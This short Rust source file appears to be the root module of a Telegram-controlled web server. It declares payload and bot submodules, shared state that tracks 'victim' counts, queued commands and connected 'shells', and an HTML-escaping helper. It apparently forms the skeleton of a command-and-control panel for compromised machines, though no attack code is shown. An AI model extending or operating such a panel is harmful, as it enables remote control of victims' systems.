pub mod payload;
pub mod bot;
pub mod index;

use dashmap::DashMap;
use std::sync::{Arc, Mutex};
use std::time::Instant;

// store the global state for telegram and axum web server
pub struct AppState {
    pub redirect: Arc<Mutex<String>>,
    pub victim: Arc<Mutex<u32>>,
    pub command: Arc<DashMap<String, String>>, 
    pub shells: Arc<DashMap<String, Instant>>,       
    pub visitor: Arc<DashMap<String, Instant>>,
    pub admin_id: i64,
}

// avoid HTML special character ; break output on telegram  
pub fn escape_html(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#039;")
        .replace('/', "&#47;")
        .replace('\\', "&#92;")
        .replace('`', "&#96;")
}
